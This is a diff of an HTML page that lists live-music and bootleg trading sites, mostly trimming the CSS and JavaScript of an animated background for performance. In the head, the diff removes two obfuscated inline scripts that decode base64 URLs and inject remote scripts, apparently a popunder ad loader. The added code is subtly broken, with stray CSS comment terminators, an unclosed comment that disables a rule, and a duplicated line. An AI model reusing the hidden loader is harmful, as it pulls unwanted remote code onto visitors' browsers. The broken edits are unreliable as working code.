@@ -18,8 +18,8 @@
         background: linear-gradient(
           135deg,
           #081c24 20%,
-          #1a3a47 40%,
-          #03090b 100%
+          #081c24 40%,
+          rgb(2, 5, 6) 100%
         );
         color: #c5c5c5;
         line-height: 1.6;
@@ -47,115 +47,94 @@
         overflow-x: hidden;
         scroll-behavior: smooth;
         -webkit-overflow-scrolling: touch;
+        contain: paint;
+        transform: translateZ(0);
+        overscroll-behavior: contain;
       }
 
-      /* Optimized dynamic background for better performance */
+      /* Optimized dynamic background with better performance settings */
       .dynamic-bg {
         position: fixed;
-        top: -25vh;
-        left: -25vw;
-        width: calc(100vw + 50vw);
-        height: calc(100vh + 50vh);
+        top: -10vh;
+        left: -10vw;
+        width: calc(100vw + 20vw);
+        height: calc(100vh + 20vh);
         pointer-events: none;
         z-index: -2;
         will-change: transform;
         contain: layout style paint;
-        background: radial-gradient(
-            ellipse at center,
-            rgba(4, 34, 63, 0.4) 10%,
-            transparent 40%
-          ),
-          radial-gradient(
-            ellipse at bottom right,
-            rgba(18, 35, 42, 0.3) 10%,
-            transparent 30%
-          ),
-          linear-gradient(45deg, #081c24, #0d1f26, #081c24);
-        overflow: hidden;
         transform: translate3d(0, 0, 0);
-        backface-visibility: hidden;
       }
 
+      /* Reduced complexity and improved GPU acceleration for holographic layers */
       .holographic-layer {
         position: absolute;
-        /* Reduced layer size for better performance and edge control */
-        width: 120%;
-        height: 120%;
-        top: -10%;
-        left: -10%;
+        width: 100%;
+        height: 100%;
+        border-radius: 50%;
         background: conic-gradient(
             from 0deg at 50% 50%,
-            rgba(10, 11, 11, 0.08) 0deg,
-            rgba(51, 80, 96, 0.06) 90deg,
-            rgba(16, 24, 29, 0.1) 180deg,
-            rgba(23, 23, 23, 0.1) 270deg,
-            rgba(4, 34, 63, 0.08) 360deg
+            rgba(4, 34, 63, 0.03) 0deg,
+            rgba(16, 24, 29, 0.05) 90deg,
+            rgba(16, 24, 29, 0.03) 180deg,
+            rgba(23, 23, 23, 0.03) 270deg,
+            rgba(4, 34, 63, 0.02) 360deg
           ),
           radial-gradient(
             circle at 50% 50%,
-            rgba(11, 31, 51, 0.04) 0%,
-            transparent 20%
+            rgba(11, 31, 51, 0.02) 0%,
+            transparent 15%
           );
-        animation: freshHolographicFlow 25s ease-in-out infinite;
+        animation: freshHolographicFlow 30s ease-in-out infinite;
         transform-origin: center;
-        filter: blur(12px) opacity(0.25);
+        filter: blur(8px) opacity(0.15);
         transform: translate3d(0, 0, 0);
         contain: layout style paint;
         backface-visibility: hidden;
+        will-change: transform, filter;
       }
 
       .holographic-layer:nth-child(2) {
-        animation-delay: -8s;
-        animation-duration: 30s;
-        opacity: 0.12;
+        animation-delay: -10s;
+        animation-duration: 35s;
+        opacity: 0.08;
         transform: rotate(45deg) translate3d(0, 0, 0);
-        filter: blur(15px) opacity(0.3);
+        filter: blur(10px) opacity(0.12);
       }
+        */
 
       .holographic-layer:nth-child(3) {
-        animation-delay: -16s;
-        animation-duration: 35s;
-        opacity: 0.06;
+        animation-delay: -20s;
+        animation-duration: 40s;
+        opacity: 0.04;
         transform: rotate(-30deg) translate3d(0, 0, 0);
-        filter: blur(18px) opacity(0.25);
-      }
+        filter: blur(12px) opacity(0.1);
+      }*/
 
+      /* Simplified mesh pattern for better performance 
       .holographic-mesh {
         position: absolute;
-        /* Reduced mesh size and simplified pattern for better performance */
-        width: 120%;
-        height: 120%;
-        top: -10%;
-        left: -10%;
+        width: 110%;
+        height: 110%;
+        top: -5%;
+        left: -5%;
         background-image: repeating-linear-gradient(
           0deg,
-          rgba(4, 34, 63, 0.008) 0px,
+          rgba(4, 34, 63, 0.004) 0px,
           transparent 1px,
-          transparent 50px,
-          rgba(45, 72, 87, 0.008) 51px,
-          transparent 52px
+          transparent 60px,
+          rgba(45, 72, 87, 0.004) 61px,
+          transparent 62px
         );
-        animation: meshDrift 50s linear infinite;
-        opacity: 0.6;
+        animation: meshDrift 60s linear infinite;
+        opacity: 0.4;
         transform: translate3d(0, 0, 0);
         contain: layout style paint;
         backface-visibility: hidden;
-      }
+        will-change: transform;
+      }*/
 
-      .holographic-orb {
-        position: absolute;
-        border-radius: 50%;
-        opacity: 0.25;
-        background: radial-gradient(
-          circle at 30% 30%,
-          rgba(6, 73, 137, 0.3),
-          rgba(44, 67, 80, 0.6),
-          rgba(51, 80, 96, 0.02),
-          transparent
-        );
-        animation: freshOrbFloat 15s ease-in-out infinite;
-        filter: blur(10px) opacity(0.5);
-      }
+      /* Holographic orb styling removed */
 
       @keyframes freshHolographicFlow {
         0%,
@@ -188,6 +167,12 @@
         box-shadow: 0 2px 22px rgba(254, 88, 0, 0.04);
         position: relative;
         z-index: 1;
+      }
+
+      /* Add containing blocks for better paint performance */
+      .container {
+        contain: content;
+        transform: translateZ(0);
       }
 
       h1 {
@@ -345,8 +330,9 @@
       .section-content {
         max-height: 0;
         overflow: hidden;
-        transition: max-height 0.4s ease-out, padding 0.3s ease;
+        transition: max-height 0.3s ease-out;
         padding: 0 20px;
+        contain: layout style paint;
       }
 
       .section-content.expanded {
@@ -499,16 +485,7 @@
           font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
       }
     </style>
-  <script type="text/javascript" data-cfasync="false">
-  /*<![CDATA[/* */
-  (function(){var z=window,w="e2efe61f601b0f6aa486a17f24572058",g=[["siteId",727*582-506+366-654+4814329],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],v=["d3d3LmludGVsbGlwb3B1cC5jb20vQ29kQi9mZzkuanM=","ZDNtcjd5MTU0ZDJxZzUuY2xvdWRmcm9udC5uZXQvSnpUQUplL2trL2lzYi1hZG1pbi0yLm1pbi5jc3M="],s=-1,u,f,e=function(){clearTimeout(f);s++;if(v[s]&&!(1783937543000<(new Date).getTime()&&1<s)){u=z.document.createElement("script");u.type="text/javascript";u.async=!0;var m=z.document.getElementsByTagName("script")[0];u.src="https://"+atob(v[s]);u.crossOrigin="anonymous";u.onerror=e;u.onload=function(){clearTimeout(f);z[w.slice(0,16)+w.slice(0,16)]||e()};f=setTimeout(e,5E3);m.parentNode.insertBefore(u,m)}};if(!z[w]){try{Object.freeze(z[w]=g)}catch(e){}e()}})();
-  /*]]>/* */
-  </script>
-    <script type="text/javascript" data-cfasync="false">
-    /*<![CDATA[/* */
-    (function(){var k=window,m="e2efe61f601b0f6aa486a17f24572058",d=[["siteId",727+762+843+207*687+5092108],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],l=["d3d3LmludGVsbGlwb3B1cC5jb20vS0FZb3kva2c5Lmpz","ZDNtcjd5MTU0ZDJxZzUuY2xvdWRmcm9udC5uZXQvSGFPS2t5L2ppcS9mc2ItYWRtaW4tMi5taW4uY3Nz"],r=-1,s,z,j=function(){clearTimeout(z);r++;if(l[r]&&!(1783937348000<(new Date).getTime()&&1<r)){s=k.document.createElement("script");s.type="text/javascript";s.async=!0;var x=k.document.getElementsByTagName("script")[0];s.src="https://"+atob(l[r]);s.crossOrigin="anonymous";s.onerror=j;s.onload=function(){clearTimeout(z);k[m.slice(0,16)+m.slice(0,16)]||j()};z=setTimeout(j,5E3);x.parentNode.insertBefore(s,x)}};if(!k[m]){try{Object.freeze(k[m]=d)}catch(e){}j()}})();
-    /*]]>/* */
-    </script>
+
   </head>
       </body>
       <!-- Updated dynamic background with holographic layers -->
@@ -830,8 +807,8 @@
               <a href="https://youtube.com">https://youtube.com</a>
               <a href="https://www.jambase.com/videos">https://www.jambase.com/videos</a>
               <a href="https://bt.etree.org/">https://bt.etree.org</a>
-              <a href="http://www.dimeadozen.org/">http://www.dimeadozen.org</a>
-              <a href="http://zombtracker.the-zomb.com/">http://zombtracker.the-zomb.com</a>
+              <a href="http://www.dimeadozen.org/">http://www.dimeadozen.org/</a>
+              <a href="http://zombtracker.the-zomb.com/">http://zombtracker.the-zomb.com/</a>
               <a href="https://www.guitars101.com/">https://www.guitars101.com</a>
               <a href="https://www.shnflac.net/">https://www.shnflac.net</a>
               <a href="https://www.musebootlegs.com/">https://www.musebootlegs.com</a>
@@ -1008,6 +985,7 @@
         } else {
           content.classList.add("expanded");
           icon.classList.add("rotated");
+          icon.classList.add("rotated");
         }
       }
 
@@ -1016,113 +994,60 @@
       });
 
       const dynamicBg = document.getElementById("dynamicBg");
-      const orbs = [];
-      const maxOrbs = 12;
 
-      // Create holographic orbs
-      for (let i = 0; i < maxOrbs; i++) {
-        createHolographicOrb();
-      }
-
-      function createHolographicOrb() {
-        const orb = document.createElement("div");
-        orb.className = "holographic-orb";
-
-        const size = Math.random() * 80 + 40;
-        orb.style.width = size + "px";
-        orb.style.height = size + "px";
-        orb.style.left = Math.random() * window.innerWidth + "px";
-        orb.style.top = Math.random() * window.innerHeight + "px";
-        orb.style.animationDelay = Math.random() * 12 + "s";
-        orb.style.animationDuration = Math.random() * 8 + 12 + "s";
-
-        dynamicBg.appendChild(orb);
-        orbs.push(orb);
-      }
-
-      let lastMouseMove = 0;
       let animationFrameId = null;
       let pendingMouseUpdate = false;
 
+      // Replace current mousemove implementation with throttled version
+      let ticking = false;
       document.addEventListener("mousemove", (e) => {
-        if (pendingMouseUpdate) return;
-
-        pendingMouseUpdate = true;
-
-        if (animationFrameId) {
-          cancelAnimationFrame(animationFrameId);
-        }
-
-        animationFrameId = requestAnimationFrame(() => {
-          const mouseX = e.clientX / window.innerWidth;
-          const mouseY = e.clientY / window.innerHeight;
-
-          const layers = document.querySelectorAll(".holographic-layer");
-          layers.forEach((layer, index) => {
-            const intensity = (index + 1) * 0.02;
-            const offsetX = (mouseX - 0.5) * intensity * 1;
-            const offsetY = (mouseY - 0.5) * intensity * 1;
-            const rotation = (mouseX - 0.5) * intensity * 0.1;
-
-            layer.style.transform = `translate3d(${offsetX}px, ${offsetY}px, 0) rotate(${rotation}deg)`;
-          });
-
-          orbs.forEach((orb, index) => {
-            const rect = orb.getBoundingClientRect();
-            const orbX = (rect.left + rect.width / 2) / window.innerWidth;
-            const orbY = (rect.top + rect.height / 2) / window.innerHeight;
-
-            const distance = Math.sqrt(
-              Math.pow(mouseX - orbX, 2) + Math.pow(mouseY - orbY, 2)
-            );
-
-            if (distance < 0.12) {
-              const force = (0.12 - distance) / 0.12;
-              const hueShift = force * 20;
-              orb.style.filter = `hue-rotate(${hueShift}deg) brightness(${
-                1 + force * 0.2
-              }) blur(${12 - force * 2}px) opacity(${0.3 + force * 0.2})`;
-              orb.style.transform = `scale(${1 + force * 0.2})`;
-            } else {
-              orb.style.filter = "blur(10px) opacity(0.2)";
-              orb.style.transform = "scale(1)";
-            }
-          });
-
-          const mesh = document.querySelector(".holographic-mesh");
-          if (mesh) {
-            const meshOffsetX = (mouseX - 0.5) * 0.5;
-            const meshOffsetY = (mouseY - 0.5) * 0.5;
-            mesh.style.transform = `translate3d(${meshOffsetX}px, ${meshOffsetY}px, 0)`;
+          if (!ticking) {
+              window.requestAnimationFrame(() => {
+                  updateLayerPositions(e);
+                  ticking = false;
+              });
+              ticking = true;
           }
-
-          pendingMouseUpdate = false;
-        });
       });
 
-      function updateHolographicColors() {
-        const time = Date.now() * 0.0008;
-        const layers = document.querySelectorAll(".holographic-layer");
+      // Cache DOM selections
+      const layers = document.querySelectorAll(".holographic-layer");
+      const mesh = document.querySelector(".holographic-mesh");
 
-        layers.forEach((layer, index) => {
-          const hueShift = Math.sin(time + index * 0.5) * 25;
-          const brightness = 0.9 + Math.sin(time * 0.3 + index) * 0.15;
-          const saturation = 1 + Math.cos(time * 0.4 + index) * 0.2;
-          layer.style.filter = `hue-rotate(${hueShift}deg) brightness(${brightness}) saturate(${saturation})`;
-        });
+      function updateLayerPositions(e) {
+          const mouseX = e.clientX / window.innerWidth;
+          const mouseY = e.clientY / window.innerHeight;
+          
+          // Use transform3d for GPU acceleration
+          layers.forEach((layer, index) => {
+              const intensity = (index + 1) * 0.01;
+              layer.style.transform = 
+                  `translate3d(${mouseX * intensity}px, ${mouseY * intensity}px, 0)`;
+          });
+      }
+
+      let colorUpdateTime = 0;
+      function updateHolographicColors() {
+        colorUpdateTime += 0.016; // ~60fps
+        
+        if (colorUpdateTime % 0.1 < 0.016) { // Update every 6 frames for better performance
+          const time = colorUpdateTime * 0.5;
+          const layers = document.querySelectorAll(".holographic-layer");
+
+          layers.forEach((layer, index) => {
+            const hueShift = Math.sin(time + index * 0.3) * 15;
+            const brightness = 0.95 + Math.sin(time * 0.2 + index) * 0.05;
+            layer.style.filter = `hue-rotate(${hueShift}deg) brightness(${brightness})`;
+          });
+        }
+          
 
         requestAnimationFrame(updateHolographicColors);
       }
 
       updateHolographicColors();
 
-      // Resize handler
-      window.addEventListener("resize", () => {
-        orbs.forEach((orb) => {
-          orb.style.left = Math.random() * window.innerWidth + "px";
-          orb.style.top = Math.random() * window.innerHeight + "px";
-        });
-      });
+      // Resize handler for orbs removed
     </script>
   </body>
 </html>
